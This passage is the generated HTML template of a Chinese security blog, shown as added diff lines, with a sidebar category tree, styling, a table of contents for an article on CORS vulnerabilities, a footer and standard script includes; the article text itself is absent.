class="hacker-category-list-count">1</span></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/SRC-%E6%B8%97%E9%80%8F/%E6%88%91%E7%9A%84SRC/%E6%8A%A5%E5%91%8A/">报告</a><span class="hacker-category-list-count">1</span></li></ul></li></ul></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/">基础知识</a><span class="hacker-category-list-count">17</span><ul class="hacker-category-list-child"><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/Linux/">Linux</a><span class="hacker-category-list-count">4</span></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/windows/">windows</a><span class="hacker-category-list-count">1</span></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/%E5%89%8D%E7%AB%AF/">前端</a><span class="hacker-category-list-count">3</span></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/%E5%90%8E%E7%AB%AF/">后端</a><span class="hacker-category-list-count">1</span></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/%E9%80%9A%E7%94%A8/">通用</a><span class="hacker-category-list-count">8</span></li></ul></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E/">漏洞</a><span class="hacker-category-list-count">11</span><ul class="hacker-category-list-child"><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E/PWN/">PWN</a><span class="hacker-category-list-count">3</span></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E/WEB%E5%AE%89%E5%85%A8/">WEB安全</a><span class="hacker-category-list-count">7</span><ul class="hacker-category-list-child"><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E/WEB%E5%AE%89%E5%85%A8/Top10/">Top10</a><span class="hacker-category-list-count">7</span></li></ul></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E/%E5%A4%8D%E7%8E%B0/">复现</a><span class="hacker-category-list-count">1</span></li></ul></li></ul></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E8%AF%81%E4%B9%A6/">证书</a><span class="hacker-category-list-count">1</span></li></ul>
+  </div>
+</div>
+
+
+<style>
+/* Hacker / Terminal Style Category Tree */
+.category-tree .hacker-category-list {
+  padding-left: 20px;
+  font-family: 'Consolas', 'Courier New', monospace;
+  color: #fff;
+  list-style-type: circle; /* 'o' bullet */
+}
+
+.category-tree .hacker-category-list .hacker-category-list {
+  list-style-type: square; /* '■' bullet */
+}
+
+.category-tree .hacker-category-list .hacker-category-list .hacker-category-list {
+  list-style-type: square;
+}
+
+.category-tree .hacker-category-list-item {
+  margin: 6px 0;
+}
+
+.category-tree .hacker-category-list-link {
+  background-color: rgba(43, 188, 138, 0.1);
+  color: #2bbc8a;
+  text-decoration: none;
+  padding: 1px 6px;
+  font-weight: bold;
+  display: inline-block;
+}
+
+.category-tree .hacker-category-list-link:hover {
+  background-color: rgba(43, 188, 138, 0.2);
+  text-decoration: none;
+}
+
+.category-tree .hacker-category-list-count {
+  color: #2bbc8a;
+  margin-left: 5px;
+}
+</style>
+	</div>
+
+	<!-- article TOC placed below the category list; should scroll with page -->
+	<div class="toc-wrapper">
+		<div class="toc-widget">
+		
+			 <div class="toc">
+				 <span class="toc-title"><i class="fa fa-list"></i> Contents</span>
+				<ol class="toc-article"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#0x00-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="toc-article-text">0x00.基础知识</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#0x01-%E5%9F%BA%E4%BA%8E%E6%BA%90%E7%AB%99%E5%8F%8D%E5%B0%84%E7%9A%84-CORS-%E6%BC%8F%E6%B4%9E"><span class="toc-article-text">0x01.基于源站反射的 CORS 漏洞</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#0x02-%E5%9F%BA%E4%BA%8E%E5%8F%97%E4%BF%A1%E4%BB%BB-null-%E6%BA%90%E7%9A%84-CORS-%E6%BC%8F%E6%B4%9E"><span class="toc-article-text">0x02.基于受信任 null 源的 CORS 漏洞</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#0x03-%E5%9F%BA%E4%BA%8E%E4%B8%8D%E4%BF%A1%E4%BB%BB%E4%B8%8D%E5%AE%89%E5%85%A8%E5%8D%8F%E8%AE%AE%E7%9A%84-CORS-%E6%BC%8F%E6%B4%9E"><span class="toc-article-text">0x03.基于不信任不安全协议的 CORS 漏洞</span></a></li></ol>
+			</div>
+		
+		</div>
+	</div>
+
+</div><!-- col-md-3 -->
+
+
+		</div>
+
+		
+
+	</div><!-- row -->
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  
+  &copy; 2026 ZQ-Rookie-Hacker's Blog
+  
+      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
+</p>
+ </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/toc.js"></script>
+<script src="/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+   <script type="text/javascript">      
+     var search_path = "search.xml";
+	 if (search_path.length == 0) {
+	 	search_path = "search.xml";
+	 }
+	 var path = "/" + search_path;
+     searchFunc(path, 'local-search-input', 'local-search-result');
+   </script>
+
+</body>
+   </html>
